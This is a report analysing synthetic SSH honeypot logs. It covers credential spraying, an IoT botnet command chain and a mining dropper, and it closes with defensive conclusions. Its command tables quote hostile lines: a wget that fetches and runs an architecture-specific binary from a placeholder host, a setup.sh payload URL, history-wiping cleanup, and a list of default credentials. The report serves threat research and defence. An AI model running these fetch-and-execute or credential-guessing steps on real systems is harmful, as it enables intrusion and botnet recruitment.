# Telemetry Report — SSH Honeypot

**Analysis window:** 7 days
**Dataset:** `logs/sample_attacks.jsonl` (83 sessions)
**Generated by:** `python3 analyze.py --log logs/sample_attacks.jsonl`

> **This report describes synthetic test data, not live captures.** The honeypot
> is fully functional and captures real sessions when exposed, but a freshly
> deployed honeypot has an empty log. To demonstrate and validate the analysis
> pipeline, `simulate_attacks.py` generates a log in the exact format
> `honeypot.py` produces, modelled on documented SSH attack patterns. All source
> addresses are RFC 5737 documentation ranges, which cannot route on the public
> internet, so no real host is implicated.
>
> Where a finding is an artefact of how the data was generated rather than a
> discovery, this report says so. That distinction is the point of including the
> caveat at all.

---

## 1. Summary

| Metric | Value |
|---|---|
| Sessions | 83 |
| Unique source IPs | 15 |
| Commands executed | 443 |
| Credential attempts | 195 |
| Distinct payload URLs captured | 2 |
| Classified automated | 78 (94.0%) |
| Classified human | 5 (6.0%) |

**35% of sessions (29 of 83) authenticated but never ran a single command.**
These are credential sprayers and port scanners — they are verifying that the
port is open and the password works, and banking the result for a later pass.
Any report counting only "attacks with commands" would miss a third of the
traffic entirely.

---

## 2. Source IP analysis

| Source IP | Sessions | Commands | Behaviour |
|---|---|---|---|
| 198.51.100.22 | 9 | 72 | IoT botnet — identical chain each time |
| 198.51.100.91 | 8 | 64 | IoT botnet |
| 192.0.2.103 | 7 | 56 | IoT botnet |
| 192.0.2.14 | 7 | 56 | IoT botnet |
| 192.0.2.57 | 7 | 56 | IoT botnet |
| 198.51.100.5 | 7 | 0 | Credential spraying only |
| 203.0.113.8 | 6 | 48 | Cryptomining dropper |

Five IPs account for 38 of the 83 sessions and run a byte-identical command
sequence. That is one botnet, not five independent attackers — the command
fingerprint identifies the family far more reliably than the address does,
which is why blocking individual IPs achieves so little against this traffic.

**Client software**, read from the SSH version banner exchanged before
encryption:

| Banner | Sessions |
|---|---|
| SSH-2.0-Go | 32 |
| SSH-2.0-libssh2_1.9.0 | 18 |
| SSH-2.0-libssh-0.9.6 | 14 |
| SSH-2.0-libssh2_1.10.0 | 14 |
| SSH-2.0-OpenSSH_9.3 | 3 |
| SSH-2.0-PuTTY_Release_0.78 | 2 |

78 of 83 sessions came from an SSH *library* rather than a terminal client.
Libraries are what you link into a scanner; OpenSSH and PuTTY are what a person
types into. This field costs nothing to collect and is strongly discriminating.

---

## 3. Credential analysis

| Credential | Attempts |
|---|---|
| root:root | 33 |
| oracle:oracle | 15 |
| pi:raspberry | 13 |
| deploy:deploy123 | 13 |
| ftpuser:ftpuser | 12 |
| root:toor | 11 |
| admin:admin | 11 |

`root` accounts for 71 of 195 attempts (36%). The rest of the list is a service
account dictionary — `oracle`, `postgres`, `jenkins`, `git`, `ftpuser` — and
`pi:raspberry`, the Raspberry Pi OS factory default, which remains in these
dictionaries because it keeps working on devices nobody reconfigured.

Nothing here is a sophisticated guess. Every one is a default or a trivial
repetition, which is the practical argument for key-based authentication: this
entire category of traffic becomes irrelevant the moment password auth is off.

---

## 4. Command and payload analysis

Most frequent commands:

| Count | Command |
|---|---|
| 38 | `/bin/busybox ECCHI` |
| 38 | `cat /proc/cpuinfo` |
| 38 | `cd /tmp \|\| cd /var/run \|\| cd /mnt` |
| 38 | `wget http://192.0.2.250/bins/arm7 -O .x` |
| 38 | `chmod 777 .x` |
| 38 | `./.x ssh` |
| 38 | `rm -rf .x` |
| 38 | `history -c` |
| 16 | `uname -a` |

**Payload URLs captured:**

| Hits | URL | Context |
|---|---|---|
| 38 | `http://192.0.2.250/bins/arm7` | ARMv7 binary — IoT botnet dropper |
| 11 | `http://203.0.113.199/setup.sh` | Shell installer — mining stage |

The `/bins/arm7` filename is itself intelligence: the attacker is fetching an
architecture-specific build, which means the dropper detected (or guessed) the
CPU first. That is standard Mirai-family behaviour — a loader that keeps builds
for arm, arm7, mips, mipsel, x86 and picks one.

Commands tagged by intent (sessions containing each behaviour):

| Stage | Sessions |
|---|---|
| recon | 54 |
| download | 49 |
| execute | 49 |
| ddos_malware | 38 |
| cleanup | 38 |
| persistence | 11 |
| credential | 5 |

The chain is consistent: **establish what the machine is → fetch an
architecture-matched binary → make it executable → run it → erase the
evidence.** `history -c` and `rm -rf .x` appear in all 38 botnet sessions,
which tells you the author expects someone to look at the box afterwards.

---

## 5. Bot vs human classification

| Verdict | Sessions | Share |
|---|---|---|
| Automated | 78 | 94.0% |
| Human | 5 | 6.0% |
| Uncertain | 0 | 0.0% |

The separation is driven by inter-command timing, and it is not marginal:

| Population | Median gap between commands |
|---|---|
| IoT botnet (38 sessions) | ~0.07 s |
| Mining dropper (11 sessions) | ~0.20 s |
| Human operators (5 sessions) | 6–9 s |

Nearly two orders of magnitude separate the slowest script from the fastest
person. `output/bot_detection.png` plots this; the clusters do not overlap, and
there is a wide empty band where the threshold sits.

A secondary signal independently confirms it: the five human-classified sessions
contain **36 backspaces between them**, and the 78 automated sessions contain
**zero**. Scripts do not correct their typing.

The timing chart also separates the two *automated* families from each other —
0.07s and 0.20s are visibly distinct bands. The classifier was built to split
bots from humans, but inter-command timing turns out to fingerprint individual
tooling as well, which was not a designed-in capability.

### What this section does not prove

The client-banner signal and the verdict agree perfectly here (all 78 library
clients classified bot, all 5 terminal clients classified human). On this
dataset that agreement is **circular**: the generator assigned library banners
to the scripted sessions, so the classifier is partly rediscovering an
assumption rather than testing it. The timing and backspace signals are
genuinely independent of each other; the banner signal is not independent of
how the sample was built.

Validating these weights properly requires real capture data, where no label
exists and the three signals can genuinely disagree. That is the honest status
of this classifier: the logic is sound and the mechanism is demonstrated, but
the thresholds are reasoned rather than empirically fitted.

---

## 6. Timing

Sessions are distributed near-uniformly across the 24-hour clock, peaking mildly
at 11:00 UTC (10 sessions). **No meaningful diurnal pattern appears in the
aggregate**, because the generator only weights the IoT botnet toward overnight
hours while scanners and sprayers are uniform, and those wash the signal out.

This is worth stating plainly rather than dressing up. On real capture data this
chart is where a diurnal pattern would show — infected consumer devices scan on
schedules, human operators work in daylight — and splitting the histogram by
classified actor type would be the way to surface it. On this sample there is
nothing to report, and reporting one anyway would be inventing a finding.

---

## 7. Conclusions

1. **The traffic is almost entirely automated.** 94% scripted, and the humans
   who do appear behave like curious operators running reconnaissance, not like
   targeted attackers.

2. **Nothing observed is sophisticated.** Every credential is a default. Every
   command is off-the-shelf. This is mass opportunistic scanning that sweeps
   the whole address space hoping for one unpatched device, not an attack
   directed at anything in particular.

3. **Behavioural signals beat address-based signals.** Five IPs running one
   identical command chain are one actor. Blocking addresses treats five
   symptoms; fingerprinting the command sequence identifies the cause.

4. **Timing is the most informative single field in the log**, and it costs one
   subtraction to collect. It separates scripts from people, and it distinguishes
   automated families from each other.

5. **The practical defence is unglamorous.** Disable password authentication,
   use keys, and every pattern in this report stops mattering — not because the
   attacks become harder, but because the only door they know how to knock on
   is no longer there.

---

## Reproducing this report

```bash
python3 simulate_attacks.py
python3 analyze.py   --log logs/sample_attacks.jsonl --json output/telemetry.json
python3 visualize.py --log logs/sample_attacks.jsonl
```

`simulate_attacks.py` is seeded, so the figures above regenerate exactly.
